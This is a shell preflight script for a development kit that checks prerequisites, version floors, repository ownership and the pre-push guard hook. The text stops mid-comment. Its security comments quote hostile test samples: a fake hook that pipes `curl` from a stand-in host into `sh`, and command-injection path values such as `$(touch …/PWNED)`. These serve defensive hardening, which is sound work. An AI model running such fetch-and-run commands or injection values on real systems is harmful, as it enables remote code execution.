#!/bin/sh
# preflight.sh — prerequisite check for Sparkwright (the agentic SDLC kit). Fails fast with
# install hints so a missing tool surfaces HERE, not as a cryptic guard/conformance
# failure later (jq is hard-required by the guard + conformance). Universal check
# always; optional per-stack toolchain via --stack.
#   sh scripts/preflight.sh [--stack <name>] [--allow-runtime-mismatch] [--selftest]
# Exit: 0 = all present · 1 = a required tool missing OR the stack's runtime floor is not met · 2 = bad usage.
# POSIX sh; dash-clean. New stack? add a row to stack_tools() (unknown degrades gracefully).
# What it changes: Read-only — checks for required/recommended tools; mutates nothing.
# Guardrails: exit 1 if a required tool is missing (recommended tools only warn); an unknown --stack degrades gracefully.
set -eu

miss=0; rec=0
# RULE 3 THROUGHOUT THIS FILE (see the K11 refusal block, "THE THREE OUTPUT RULES"): `printf '%s\n'`,
# never `echo`, for any line carrying a VARIABLE. dash's builtin echo expands backslash escapes and dash
# IS /bin/sh on the ubuntu-latest runner, so a `\n` inside an interpolated value forges a whole extra
# output line. The rule was written for the K11 refusal and swept through the CP-11/CP-4 blocks; the
# security re-review (finding L-3) found a survivor, so it is now applied to every instance in the
# script's PRODUCTION path rather than to the blocks someone happened to look at.
# SCOPE, STATED SO IT IS NOT MISTAKEN FOR AN OVERSIGHT: the `--selftest` harness's own PASS/FAIL lines
# still use `echo` with interpolated fixture output. They are a test harness reporting to a developer,
# not a security surface — and a forged `PASS:` line cannot change the verdict, which is the `fail`
# accumulator: `fail` is set by the leg, never read back off stdout, so no line a fixture can produce
# moves it. Sweeping ~140 verdict lines would be diff without teeth.
# THIS SENTENCE USED TO CLAIM MORE THAN THAT — "the `fail` accumulator AND the literal
# `OK: preflight selftest` trailer that conformance/adopter-preflight-wired.sh requires" — and the
# trailer half was wrong (security re-review, finding INFO-3). READ THAT CONSUMER: it runs the selftest
# with `|| true`, DISCARDING the exit code, then greps stdout for the literal trailer. For it the
# trailer IS the whole signal, so a line carrying that literal string would satisfy it whatever `fail`
# says. (`fail` is still gated — by the OTHER route: the dedicated CI step in .github/workflows/ci.yml
# that runs `sh scripts/preflight.sh --selftest` bare reads its exit code. Cited by its command rather
# than by a line number, for the reason stated at the k11_run block. One of the two consumers reads rc;
# the sentence above said both did.) NOT EXPLOITABLE, and that is a property of the INPUTS rather than
# of the output rule: every fixture path is `mktemp -d` under TMPDIR plus a suffix this script chooses,
# and TMPDIR is the operator's or the runner's. The correction is recorded rather than quietly deleted
# because a rationale that reads stronger than it is becomes the reason a later reviewer skips the
# check — which is the failure mode this file keeps paying for.
need() {  # need <tool> <install-hint>
  if command -v "$1" >/dev/null 2>&1; then
    printf '%s\n' "  ok   $1"
  else
    printf '%s\n' "  MISS $1 — $2"
    miss=1
  fi
}
recommend() {  # recommend <tool> <why+hint> — warns, never fails the run
  if command -v "$1" >/dev/null 2>&1; then
    printf '%s\n' "  ok   $1"
  else
    printf '%s\n' "  warn $1 — $2"
    rec=1
  fi
}

# --- T2: git version floor for `git merge-tree --write-tree` -------------------------------
# kit-update prefers `git merge-tree --write-tree` — a NON-mutating 3-way merge (the adopter's
# worktree is never touched). That subcommand landed in git 2.38 (2022); Ubuntu 20.04 still ships
# git 2.25. DETECT AND DEGRADE: below the floor we warn and NAME the escape (the temporary-worktree
# fallback, which is also non-mutating) — we never hard-fail, and we never silently fail open.
GIT_FLOOR_MAJOR=2
GIT_FLOOR_MINOR=38

git_version_parts() {  # <version line> -> "MAJOR MINOR" on stdout; rc 1 when unparseable
  # Takes the first whitespace-separated token starting with a digit, so it survives every real
  # shape: "git version 2.39.5 (Apple Git-154)", "git version 2.25.1", "git version 2.41.0.windows.3".
  #
  # `set -f` around the split: unquoted $1 does word-splitting (which we WANT) *and* pathname expansion
  # (which we do not). A '*' anywhere in the line would glob against the CWD, so a file named '9.9.9'
  # would BE the version — the floor reading the filesystem instead of git. Quoting $1 is not the fix
  # (it would collapse the line to a single word and parse nothing); disabling globbing is. No `return`
  # inside the window, so globbing is always restored.
  _tok=""
  set -f
  for _w in $1; do
    case "$_w" in [0-9]*) _tok=$_w; break ;; esac
  done
  set +f
  [ -n "$_tok" ] || return 1
  _maj=${_tok%%.*}
  case "$_tok" in *.*) _rest=${_tok#*.} ;; *) _rest=0 ;; esac
  _min=${_rest%%.*}
  _min=${_min%%[!0-9]*}   # tolerate a pre-release tail (2.39-rc1 -> 39)
  case "$_maj" in ''|*[!0-9]*) return 1 ;; esac
  case "$_min" in ''|*[!0-9]*) return 1 ;; esac
  printf '%s %s\n' "$_maj" "$_min"
}

git_meets_floor() {  # <major> <minor> -> 0 iff >= the floor. NUMERIC compare, deliberately:
  # `[ ]`'s -gt/-ge are integer operators, so 9 -lt 38 is TRUE. A lexical compare would say
  # "2.9" > "2.38" and wave an ancient git through — a decorative floor. This is that bug's lock.
  if [ "$1" -ne "$GIT_FLOOR_MAJOR" ]; then [ "$1" -gt "$GIT_FLOOR_MAJOR" ]; return $?; fi
  [ "$2" -ge "$GIT_FLOOR_MINOR" ]
}

check_git_capability() {  # advisory: does the installed git support `merge-tree --write-tree`?
  # FLAG-NOT-ENV: the PREFLIGHT_GIT_VERSION_CMD injection seam is honored ONLY when a seam flag was
  # passed (--selftest, or --selftest-e2e for the wired end-to-end proof). In a real adopter run the
  # ambient environment cannot tell preflight what version of git they have. Advisory-only, so no
  # privilege boundary is crossed — but a check the environment can redirect is not a check, and this
  # is the same rule `incept --date` honors (a flag, never an ambient INCEPT_DATE).
  _vcmd="git --version"
  [ "${SEAMS:-0}" -eq 1 ] && _vcmd="${PREFLIGHT_GIT_VERSION_CMD:-git --version}"
  # shellcheck disable=SC2086  # deliberate word-split: the seam supplies a command line, not one word
  _ver=$(${_vcmd} 2>/dev/null) || _ver=""
  if [ -z "$_ver" ]; then
    echo "  skip git version — could not run 'git --version' (cannot detect merge-tree support)"; return 0
  fi
  if ! _parts=$(git_version_parts "$_ver"); then
    printf '%s\n' "  skip git version — unrecognised version string: $_ver"; return 0   # Rule 3
  fi
  _gmaj=${_parts% *}; _gmin=${_parts#* }
  if git_meets_floor "$_gmaj" "$_gmin"; then
    printf '%s\n' "  ok   git $_gmaj.$_gmin — 'git merge-tree --write-tree' available (floor $GIT_FLOOR_MAJOR.$GIT_FLOOR_MINOR)"
  else
    printf '%s\n' "  warn git $_gmaj.$_gmin is below the $GIT_FLOOR_MAJOR.$GIT_FLOOR_MINOR floor — 'git merge-tree --write-tree' is unavailable."
    echo "       kit-update will use its temporary-worktree fallback instead of merge-tree. The fallback is"
    echo "       still non-mutating (your worktree is never touched); upgrading git only makes it faster."
    rec=1
  fi
}

stack_tools() {  # print "tool|hint" lines for a stack; return 1 if unknown
  case "$1" in
    typescript-node) printf 'node|nodejs.org or nvm\nnpm|ships with Node\n' ;;
    python|ml|data-engineering) printf 'python3|python.org or pyenv\npip3|ships with Python\n' ;;
    go) printf 'go|go.dev/dl\n' ;;
    dotnet) printf 'dotnet|dotnet.microsoft.com/download\n' ;;
    rust) printf 'cargo|rustup.rs\n' ;;
    java-spring) printf 'java|adoptium.net\nmvn|maven.apache.org\n' ;;
    kotlin) printf 'java|adoptium.net\n' ;;
    terraform) printf 'terraform|developer.hashicorp.com/terraform/install\n' ;;
    *) return 1 ;;
  esac
}

# --- T5 (CP-7 K3/K5): the DECLARED runtime floor is ENFORCED, not merely declared ----------
# The typescript-node profile declares Node 24 in FIVE places (engines.node in both scaffolds,
# node-version: '24' in the emitted CI, scaffold/.nvmrc, scaffold/.node-version, the profile doc) and
# enforced it in NONE: preflight checked only that `node` EXISTS. A cold operator on Node 20.10 got a
# green "All prerequisites present.", `npm ci` then proceeded on an EBADENGINE *warning*, and the
# failure finally surfaced deep inside Rolldown as `node:util.styleText` — unreadable as a version
# problem. That truncated install went on to drop an optional native package (a second, separate
# finding). Enforcing the floor HERE, at the first thing anyone runs, retires both.
#
# POLICY (owner-ratified): HARD-FAIL WITH A NAMED ESCAPE.
#   below the floor  -> REFUSE (non-zero), naming the running version, the required floor, AND
#                       --allow-runtime-mismatch in the same message (never make the reader search).
#   with that flag   -> proceed, but WARN loudly and SUPPRESS the clean green — a suppressed refusal
#                       must never read as a pass. It exits 0 by design: the operator asked to proceed.
#   floor unreadable -> WARN with the reason. Fail-safe toward disclosure; never a silent skip and
#                       never a version-verified green we did not earn.
# Warn-and-continue is precisely what produced the defect; a bare hard-fail would strand an adopter on
# an unusual-yet-working runtime. Signpost the escape, don't relax the rule.
#
# SINGLE SOURCE: the floor is READ from profiles/<stack>/scaffold/.nvmrc — the declaration that already
# exists. This adds no sixth declaration, so the floor cannot drift away from the profile.
RUNTIME_REFUSE=0   # armed when the running runtime is below the floor and no escape was passed
RUNTIME_WAIVED=0   # armed when that refusal was waived by --allow-runtime-mismatch
RUNTIME_FOUND=""   # the running version line, as reported (e.g. v20.20.2)
RUNTIME_FLOOR=""   # the required MAJOR, as declared (e.g. 24)
RUNTIME_SRC=""     # where the floor was read from

node_major() {  # <version line> -> MAJOR on stdout; rc 1 when unparseable
  # Accepts every real shape: "v24.18.0" (node --version), "24" (.nvmrc), "v24.4.0" (.nvmrc), "20.10.0".
  # `set -f` around the split, for the same reason git_version_parts needs it: unquoted $1 word-splits
  # (which we WANT) *and* pathname-expands (which we do not). A '*' in the line would glob against the
  # CWD, so a file named '99.9.9' would BE the running version — a floor reading the filesystem instead
  # of the runtime, and here that would SILENCE a real refusal. No `return` inside the window.
  _tok=""
  set -f
  for _w in $1; do
    case "$_w" in
      v[0-9]*) _tok=${_w#v}; break ;;
      [0-9]*)  _tok=$_w;     break ;;
    esac
  done
  set +f
  [ -n "$_tok" ] || return 1
  _nmaj=${_tok%%.*}
  _nmaj=${_nmaj%%[!0-9]*}   # tolerate a pre-release tail (24-nightly -> 24)
  case "$_nmaj" in ''|*[!0-9]*) return 1 ;; esac
  printf '%s\n' "$_nmaj"
}

read_runtime_floor() {  # <.nvmrc path> -> floor MAJOR on stdout; rc 1 when absent/unreadable/unparseable
  # All three failure modes are rc 1 and the CALLER warns with the reason — a moving alias ("lts/iron")
  # must never be turned into an invented number, and an absent file must never read as "verified".
  [ -f "$1" ] && [ -r "$1" ] || return 1
  _fl=""
  while IFS= read -r _fline || [ -n "$_fline" ]; do
    case "$_fline" in ''|'#'*) continue ;; esac
    _fl=$_fline; break
  done < "$1"
  [ -n "$_fl" ] || return 1
  node_major "$_fl"
}

runtime_floor_applies() {  # <stack> -> 0 iff this stack RUNS on node (so .nvmrc is its floor)
  # PER-STACK, NEVER GLOBAL: go/python/rust have no .nvmrc and must be completely unaffected. The
  # discriminator is the stack's own tool map, which is why an absent .nvmrc can be a silent N/A for a
  # non-Node stack and an UNVERIFIED warning for a Node one (where the floor is expected to exist).
  stack_tools "$1" 2>/dev/null | grep -q '^node|'
}

check_runtime_floor() {  # <stack> <.nvmrc path> — prints one report line; may arm the refusal/waiver
  runtime_floor_applies "$1" || return 0
  RUNTIME_SRC=$2
  # FLAG-NOT-ENV: the seam is honored only when a seam flag was passed (--selftest/--selftest-e2e).
  # Load-bearing here in a way it is not for the advisory git floor: this check BLOCKS, so an ambient
  # export that could tell it "you are on Node 24" would turn a refusal into a pass.
  _rtcmd="node --version"
  [ "${SEAMS:-0}" -eq 1 ] && _rtcmd="${PREFLIGHT_NODE_VERSION_CMD:-node --version}"
  # shellcheck disable=SC2086  # deliberate word-split: the seam supplies a command line, not one word
  _rtline=$(${_rtcmd} 2>/dev/null) || _rtline=""
  if [ -z "$_rtline" ]; then
    echo "  warn node runtime floor UNVERIFIED — could not run 'node --version'"
    rec=1; return 0
  fi
  if ! _rtmaj=$(node_major "$_rtline"); then
    printf '%s\n' "  warn node runtime floor UNVERIFIED — unrecognised version string: $_rtline"   # Rule 3
    rec=1; return 0
  fi
  if ! _rtfloor=$(read_runtime_floor "$RUNTIME_SRC"); then
    printf '%s\n' "  warn node runtime floor UNVERIFIED — $RUNTIME_SRC is missing, unreadable, or not a version"
    printf '%s\n' "       (running node $_rtline; nothing here has verified it against the profile's floor)"
    rec=1; return 0
  fi
  RUNTIME_FOUND=$_rtline; RUNTIME_FLOOR=$_rtfloor
  # NUMERIC compare, deliberately — the git floor's lesson, one stack over: lexically "9" > "24", so a
  # string-naive compare would wave Node 9 through a Node 24 floor and be decorative.
  if [ "$_rtmaj" -ge "$_rtfloor" ]; then
    printf '%s\n' "  ok   node $_rtline meets the Node $_rtfloor floor (declared in $RUNTIME_SRC)"   # Rule 3
    return 0
  fi
  if [ "$ALLOW_RUNTIME_MISMATCH" -eq 1 ]; then
    RUNTIME_WAIVED=1
    printf '%s\n' "  WARN node $_rtline is BELOW the required Node $_rtfloor floor ($RUNTIME_SRC)."
    echo "       Proceeding ONLY because --allow-runtime-mismatch was passed. This is an UNSUPPORTED"
    echo "       runtime: 'npm ci' will refuse it (engine-strict), and whatever does install can fail"
    echo "       deep inside a dependency in ways that do not look like a version problem."
    return 0
  fi
  RUNTIME_REFUSE=1
  printf '%s\n' "  MISS node $_rtline is below the required Node $_rtfloor floor — see the error below"   # Rule 3
}

is_github_repo() {  # 0 iff inside a work tree whose origin is a github.com remote
  git rev-parse --is-inside-work-tree >/dev/null 2>&1 || return 1
  _origin=$(git remote get-url origin 2>/dev/null) || return 1
  case "$_origin" in *github.com*) return 0 ;; *) return 1 ;; esac
}

# --- CP-4: repository ownership is a hard precondition -------------------------------------
# `git rev-parse --is-inside-work-tree` answers "is there a repo ABOVE me?" — not "is THIS dir the
# root of its own repo?". The two diverge only when nested, which is why every non-nested test
# agrees and why the kit once wrote a pre-push hook into a stranger's repository.
#
# BOTH sides of the compare must be PHYSICAL paths: `--show-toplevel` is symlink-resolved, `$PWD`
# is not. On macOS /tmp -> /private/tmp, so a logical compare FALSE-REFUSES under /tmp while
# passing on Linux CI. Normalizing both sides is the only compare that cannot drift.
#
# CP-11 closes the git-dir-CONTAINMENT gap: GIT_DIR/GIT_WORK_TREE env redirects are hard-refused, and
# submodule / `git worktree add` trees are refused unless gated behind --allow-nested. Residual (named,
# not absorbed): core.hooksPath, GIT_OBJECT_DIRECTORY, insteadOf — the git dir stays inside the cwd, so
# containment passes; out of CP-11 scope. See CP-11 design §6.
owning_repo_root() {  # <dir> -> stdout: physical toplevel, or empty when <dir> is in no repo
  ( CDPATH='' cd "$1" 2>/dev/null || exit 0
    _t=$(git rev-parse --show-toplevel 2>/dev/null) || exit 0
    CDPATH='' cd "$_t" 2>/dev/null && pwd -P )
}
owns_itself() {  # <dir> -> 0 iff <dir> is its own repo root, or is in no repo at all
  # "Cannot determine" must REFUSE, never proceed (the kit's default). Compute the physical cwd FIRST:
  # a dir we cannot even cd into is not "in no repo -> fine", it is unknown -> refuse. Unreachable from
  # today's call sites (all pass "$PWD"/"$ROOT"), but the wrong default is worth closing.
  _phys=$( CDPATH='' cd "$1" 2>/dev/null && pwd -P ) || return 1
  [ -n "$_phys" ] || return 1
  _own=$(owning_repo_root "$1")
  [ -n "$_own" ] || return 0
  [ "$_own" = "$_phys" ]
}

# --- CP-11: git-dir redirection is a hard precondition (closes CP-4 §6) --------------------
# CP-4 proves toplevel==pwd, but `--show-toplevel` reports the cwd even when GIT_DIR/GIT_WORK_TREE, a
# submodule, or a `git worktree add` tree redirect the git dir ELSEWHERE (measured). The hook then lands
# in a repo the operator does not own (env) or a shared/other .git (structural). Invariant: the git dir
# that will receive the write lives INSIDE the tree I own. BOTH sides physical (the /tmp symlink landmine).
git_env_redirected() { [ -n "${GIT_DIR:-}" ] || [ -n "${GIT_WORK_TREE:-}" ]; }
git_dir_outside() {  # <dir> -> 0 (true) iff the physical git-common-dir is NOT inside <dir>
  _cwd=$( CDPATH='' cd "$1" 2>/dev/null && pwd -P ) || return 0
  _gcd=$( CDPATH='' cd "$1" 2>/dev/null && git rev-parse --git-common-dir 2>/dev/null ) || return 1
  [ -n "$_gcd" ] || return 1
  _gcd_phys=$( CDPATH='' cd "$1" 2>/dev/null && CDPATH='' cd "$_gcd" 2>/dev/null && pwd -P ) || return 0
  case "$_gcd_phys/" in "$_cwd"/*) return 1 ;; *) return 0 ;; esac
}

# --- K11: the pre-push runtime guard must actually be in force -----------------------------
# git clones neither .git/hooks/ nor .git/config, so an incepted repo's guard is ABSENT in every
# fresh clone. That is by design (hooks/pre-push:4 — "A SPEED BUMP, not a boundary"); the defect is
# that the absence is SILENT. Detection semantics are inception-done.sh:64-78's, verbatim.
GUARD_REFUSE=0; GUARD_STATE=""; GUARD_HOOK=""

guard_tree_class() {  # -> stdout: exactly one of incepted|kit-source|bare ; always exit 0
  # OWNER-AUTHORED (design §9). This predicate decides refuse-vs-silence, and both errors are costly:
  #   too broad  -> preflight cries wolf on the kit's own tree and is ignored (doctor.sh:18)
  #   too narrow -> fails open in exactly the fresh clone K11 exists for
  #
  # Measured signals available (verified 2026-07-21, kit 3.169.0):
  #   .kit-manifest        present in export/adopter lineage; ABSENT in the kit source tree
  #   git rev-parse --is-inside-work-tree   is there a .git at all to hold a hook
  #   docs/architecture/ADR-000-stack.md    inception produced its charter (also present in kit source)
  #   hooks/pre-push       the SOURCE hook; rides along in both trees, so NOT discriminating alone
  #   ENGINEERING-PRINCIPLES.md   incept.sh:540 renames the kit's principles CLAUDE.md to this, so it is
  #                        present in EVERY incepted tree and absent from the kit source (re-measured
  #                        2026-07-21; not in the plan's menu — the k11_fx fixture supplies it)
  #   CLAUDE.md            PRESENT IN BOTH CLASSES, so a PRESENCE test on it is useless — worse, it is
  #                        fail-open. incept.sh:540 renames the principles CLAUDE.md away and
  #                        incept.sh:561 immediately RE-CREATES CLAUDE.md from
  #                        templates/PROJECT-CLAUDE-TEMPLATE.md; that is exactly why
  #                        inception-done.sh:41-42 requires BOTH files of a done inception. It
  #                        discriminates only by CONTENT: the kit source's CLAUDE.md carries the literal
  #                        "Engineering Principles & Definition of Done" (the marker incept.sh:305 keys
  #                        on to decide a tree is an un-incepted kit); a project's CLAUDE.md carries
  #                        "**Project:**" and never that marker (measured: the phrase does not occur in
  #                        templates/PROJECT-CLAUDE-TEMPLATE.md).
  #
  # Contract enforced by legs P1/N1/N2/W1/W2/W3/U1/H1/H2/X1/F1 (incepted) and A1 (kit-source must be
  # SILENT); the fixture SHAPES those legs rest on are themselves locked by S1/S2.
  # ANCHOR THE FILE TESTS AT THE REPO TOP-LEVEL (`git rev-parse --show-toplevel`), not at the cwd: leg
  # W3 runs the check from a subdirectory, and a cwd-relative predicate answers kit-source there, which
  # silences the whole check from every subdirectory (measured while building W3).
  # No repo at all -> `bare`. There is no .git to hold a hook, so there is no obligation to report on
  # and nothing to say. `--show-toplevel` fails outright outside a work tree; treat an empty answer the
  # same way rather than falling through with an empty $_top and testing paths rooted at "/".
  _top=$(git rev-parse --show-toplevel 2>/dev/null) || { echo bare; return 0; }
  [ -n "$_top" ] || { echo bare; return 0; }

  # ENGINEERING-PRINCIPLES.md is INCEPTION'S OWN ARTIFACT: incept.sh:540 renames the kit's principles
  # doc to this name, and inception-done.sh:41 hard-requires it in a done inception. It is the narrowest
  # single fact meaning "inception ran in this tree", which is exactly when a missing guard is a defect.
  #
  # DELIBERATELY NOT conjoined with .kit-manifest or CLAUDE.md, though both are available and the
  # conjunction would also pass the fixtures. Every added condition is one more way to answer
  # kit-source -- i.e. one more door to SILENCE -- and silence in an incepted tree is precisely the
  # failure K11 exists to close. An incepted repo that has lost .kit-manifest is still an incepted repo
  # whose missing guard should be reported. Bias the ambiguity toward speaking up, never toward quiet.
  [ -f "$_top/ENGINEERING-PRINCIPLES.md" ] && { echo incepted; return 0; }

  # Everything else -- the un-incepted kit source tree, and any unrelated repo preflight happens to be
  # run in -- classifies kit-source and stays SILENT. Reporting a "missing" guard to someone who never
  # asked for one is the cry-wolf failure doctor.sh:18 warns about, and it is not our repo to police.
  echo kit-source
}

guard_is_kit_hook() {  # <path> -> 0 (true) iff that file CARRIES the kit's marker. NOT a verification.
  # THE SINGLE DEFINITION of "carries the kit's marker" (design §4.3): the KIT_GUARD_CORE token, and
  # nothing else — not the filename, not the mode bits, not which tree it sits in.
  #
  # WHAT THIS PREDICATE IS NOT — corrected in the final fix-loop (finding X1), because the previous
  # wording of this comment ("IS the kit's guard") claimed more than the code delivers, and
  # OVERCLAIMING A CONTROL IS ITSELF THE DEFECT. `grep -q KIT_GUARD_CORE` is a SUBSTRING test. The
  # substring is public, it appears in this very file, and anyone writing a hostile hook can put it in
  # a COMMENT. MEASURED (2026-07-21): a `hooks/pre-push` whose body was
  # `# KIT_GUARD_CORE` + `curl -s http://evil.invalid/x | sh` satisfied this predicate and received the
  # full vouched `cp … && chmod +x …`. The T2 fix-loop's own fixture passed only because it OMITTED the
  # token — i.e. the leg tested an attacker who did not try.
  #
  # So the contract is asymmetric, deliberately, and both callers are written to it:
  #   FALSE  is dispositive — no marker means it is definitely not ours; a cheap FIRST FILTER that may
  #          REJECT.
  #   TRUE   is NOT dispositive — it means "not rejected by the cheap filter", nothing more. No caller
  #          may treat it as a vouch. The refusal block prints a digest and the path, tells the HUMAN
  #          how to inspect the file with their own tools, and asks THEM to verify, because nothing
  #          available to a shell script can do it here. (This sentence used to say "prints a digest and
  #          an excerpt". It did, and the excerpt was the security re-review's BLOCK — see Rule 4 where
  #          guard_excerpt used to be. Corrected here rather than left as one more stale claim about a
  #          mechanism that no longer exists, which is this file's own recurring failure.)
  # Locked by legs MP7/MP8 (the filter still rejects) and MP10 (a TRUE does not produce a vouch).
  #
  # Extracted into a predicate because it has TWO callers and they must never drift apart:
  #   1. check_guard_installed, on the DESTINATION (.git/hooks/pre-push) — is the installed hook ours?
  #   2. the main-body refusal, on the SOURCE (<toplevel>/hooks/pre-push) — is the file we are about to
  #      show a human worth showing at all, or is it plainly not the kit's?
  # Caller 2 was added in the T2 fix-loop (finding J2). Before it, the source half was exempt from the
  # definition and the refusal printed a paste-able install command for whatever happened to sit at that
  # path — measured: a hooks/pre-push containing `curl -s http://evil.invalid/ | sh` produced the full
  # `cp … && chmod +x …` instruction with no caveat. Locked by legs MP7/MP8.
  #
  # UNREADABLE / ABSENT => FALSE, and that asymmetry is deliberate on each side. `grep -q … 2>/dev/null`
  # cannot tell "no marker" from "cannot read", so this predicate answers "not even carrying the token".
  # For caller 2 that is exactly the safe direction: a source that cannot be read is one we must not
  # show or offer. For caller 1 it would NOT be safe on its own — an unreadable KIT hook answering
  # "foreign" is fail-open behind a reassuring message — which is why that caller keeps its own explicit
  # `-r` test BEFORE this one and refuses `unreadable` as its own state. Moving this predicate ahead of
  # that test would re-open the hole leg U1 closes.
  grep -q 'KIT_GUARD_CORE' "$1" 2>/dev/null
}

# --- K11 fix-loop: the three rules every printed path obeys ---------------------------------
# All three exist because the T2 refusal applied a rule it had already stated correctly to ONE of its
# instances. Each is a PREDICATE/HELPER with a single definition, for the reason guard_is_kit_hook is:
# two copies of a security rule drift, and the copy that drifts is the hole.

guard_shq() {  # <string> -> that string, POSIX-quoted so it is INERT on a command line
  # RULE 1. Double quotes do NOT neutralise `$(…)` or backticks, so every `cp "<path>"` this script
  # printed was a command-injection primitive the moment a repo path carried one. MEASURED
  # (2026-07-21): a repo root named `pkg$(touch …/PWNED)x` produced a fix line whose paste CREATED
  # `PWNED`. That is not exotic input — `git check-ref-format --branch 'x$(id)y'` ACCEPTS the name
  # (measured), so any CI workspace derived from a branch or PR name is attacker-shaped.
  # Single quotes are the only shell quoting with no interior expansion at all; the sed turns each
  # embedded `'` into `'\''` (close, escaped quote, reopen). Round-tripped (2026-07-21) against
  # `$(…)`, backticks, `$HOME`, an apostrophe and `'';id;''` in sh, dash and bash.
  # THE `printf X` SENTINEL IS LOAD-BEARING: `$( )` strips trailing newlines, so without it a path
  # ending in one would be quoted into a DIFFERENT path. guard_path_hostile already rejects such a
  # path upstream — but a helper that is only correct because of a caller's precondition is the exact
  # defect class this fix-loop exists to close, so it is correct on its own.
  _shq=$( printf '%s' "$1" | sed "s/'/'\\\\''/g"; printf X )
  printf "'%s'" "${_shq%X}"
}

guard_path_hostile() {  # <string> -> 0 (true) iff it carries a control character
  # RULE 2. `printf '%s\n'` defeats BACKSLASH escapes; it does nothing at all about a LITERAL
  # newline, which passes straight through and forges a whole extra output line. MEASURED
  # (2026-07-21): a repo root whose name contained a real newline made the refusal branch whose
  # entire purpose is to REFUSE an install command print two complete `cp … && chmod +x …` blocks,
  # commenting out the real trailing path with an injected `#`. A `printf`-only fix cannot see that.
  # Rejection at parse time is the answer, and it is the kit's established one — CP-7 Slice 2 used
  # exactly this `case` against `--intent-owner` injection.
  # SCOPE: control characters only. A path may legitimately contain spaces, quotes, `$` and UTF-8;
  # those are handled by guard_shq (command lines) and by printf (labelled facts). Only a control
  # character can create a LINE, and a line is what forges a verdict.
  case "$1" in *[[:cntrl:]]*) return 0 ;; *) return 1 ;; esac
}

guard_resolve() {  # <path> -> its physical form, resolving the PARENT only; rc 1 when unresolvable
  # RULE 3. `cd -- "$p" && pwd -P` requires `$p` ITSELF to exist, which silently converts "this path
  # does not exist yet" into "this path is unresolvable" — and every caller reads unresolvable as
  # "some other tool owns this, stay quiet". MEASURED (2026-07-21): a repo whose `.git/hooks` does not
  # exist (created with an empty `--template`) plus the no-op `core.hooksPath=.git/hooks` took the
  # disclosed skip on a genuinely unguarded incepted tree — a fail-OPEN inside the fail-safe, and a
  # direct contradiction of design §8 ("is NOT skipped — it is judged normally").
  # Resolving the PARENT and appending the basename is existence-independent for the last component,
  # which is the only component that can be legitimately absent here.
  _gr_d=$(dirname -- "$1") || return 1
  _gr_b=$(basename -- "$1") || return 1
  _gr_p=$( CDPATH='' cd -- "$_gr_d" 2>/dev/null && pwd -P ) || return 1
  [ -n "$_gr_p" ] || return 1
  case "$_gr_b" in
    .|/) printf '%s\n' "$_gr_p" ;;
    ..)  ( CDPATH='' cd -- "$_gr_p/.." 2>/dev/null && pwd -P ) || return 1 ;;
    *)   printf '%s\n' "${_gr_p%/}/$_gr_b" ;;
  esac
}

guard_resolve_deep() {  # <path> -> physical form; only the deepest EXISTING ancestor need exist
  # RULE 3, SECOND FORM — and the two forms are NOT interchangeable, which is why both exist.
  # guard_resolve is existence-independent for the LAST component only. That is exactly right for the
  # core.hooksPath comparison, where an unresolvable value must stay unresolvable: leg H3 depends on
  # `<worktree>/.git/hooks` FAILING to resolve (in a linked worktree `.git` is a FILE) so the
  # main-worktree retry fires. A resolver that walked past that file would answer `<wt>/.git/hooks`,
  # the comparison would differ from the main tree's default hooks dir, and the check would SKIP from a
  # linked worktree — the fail-open H3 was written to close. Measured while building this helper.
  # But for a path being printed into a paste-able COMMAND the requirement is the opposite: make it
  # absolute whatever is missing. MEASURED (2026-07-21): with `.git/hooks` absent — the very repo shape
  # the Y1 fix made reachable — `$GUARD_HOOK` stayed RELATIVE and the refusal emitted
  # `mkdir -p '.git/hooks' && cp … '.git/hooks/pre-push'`, a command that silently targets the wrong
  # tree when pasted from anywhere else. That is the §4.5 broken-paste defect W3 and MP5 exist for,
  # surfacing in a repo shape no fixture had reached before. So: walk up to the deepest ancestor that
  # does resolve, then re-append what was peeled off.
  # `.`/`..` are NEVER peeled — they always resolve when reachable, so failing on one means a
  # permission problem, and re-appending `..` to an already-physical path would invent a path. rc 1
  # there, and the caller leaves the value alone rather than printing something it made up.
  _grd_p="$1"; _grd_tail=""
  while :; do
    _grd_abs=$( CDPATH='' cd -- "$_grd_p" 2>/dev/null && pwd -P ) && break
    _grd_b=$(basename -- "$_grd_p") || return 1
    _grd_d=$(dirname -- "$_grd_p") || return 1
    [ "$_grd_d" != "$_grd_p" ] || return 1
    case "$_grd_b" in .|..) return 1 ;; esac
    _grd_tail="/$_grd_b$_grd_tail"
    _grd_p="$_grd_d"
  done
  # THE ROOT IS THE ONE ANCESTOR `%/` DESTROYS (security re-review, finding MED-1). `pwd -P` returns a
  # trailing slash for exactly one directory — `/` — and the `%/` that exists to stop `//` appearing in
  # the joined path strips the ONLY character there. With an empty tail the helper then printed the
  # EMPTY STRING WITH RC 0: a success return carrying no value, which every caller reads as
  # "unresolvable, stay quiet" via its own `[ -n … ] || return 1`. MEASURED identically in sh, dash and
  # bash (2026-07-21) — and MEASURED end to end: with `.git/hooks -> /`, guard_hooks_dir_escapes skipped
  # containment through that rc-0 arm and the refusal emitted `mkdir -p '/' && cp … '/pre-push' &&
  # chmod +x '/pre-push'`. A fail-open reached through a SUCCESS path is invisible to every caller that
  # only checks rc, which is why the answer is here and not in a caller. `/` is the correct answer, not
  # rc 1: the root IS resolvable, the callers must be able to test it for containment, and returning
  # rc 1 would put the same fail-open back one layer down. Locked by leg D3.
  [ -n "$_grd_abs" ] || return 1
  _grd_out="${_grd_abs%/}$_grd_tail"
  [ -n "$_grd_out" ] || _grd_out="/"
  printf '%s\n' "$_grd_out"
}

guard_hooks_dir_escapes() {  # <hook path> -> 0 (true) iff its DIRECTORY resolves OUTSIDE the git dir
  # M-1. The `dangling` branch tests `[ -h "$GUARD_HOOK" ]` — the LEAF. A `.git/hooks` that is ITSELF a
  # symlink walks straight past that test, and MEASURED (2026-07-21) the refusal then emitted
  # `mkdir -p '<outside>' && cp … '<outside>/pre-push' && chmod +x '<outside>/pre-push'`: an executable
  # written OUTSIDE the repository, which is exactly the outcome `dangling` exists to prevent, one path
  # component up. Same precondition as `dangling` (local write access to `.git/`), so this is hardening
  # rather than a live attack — but offering the command is the wrong ANSWER regardless.
  #
  # PHYSICAL CONTAINMENT, AND ONLY THAT. The task brief offered two triggers — "`--git-path hooks` is a
  # symlink, OR the physical hooks dir is not inside the git dir" — and the first was built, MEASURED,
  # and then REMOVED. Both halves of that are worth recording:
  #   * IT HAD NO INDEPENDENT KILL. Mutation-tested (2026-07-21): deleting the `[ -h ]` trigger and
  #     keeping containment leaves leg D2 RED for the same two assertions. Every escape it caught,
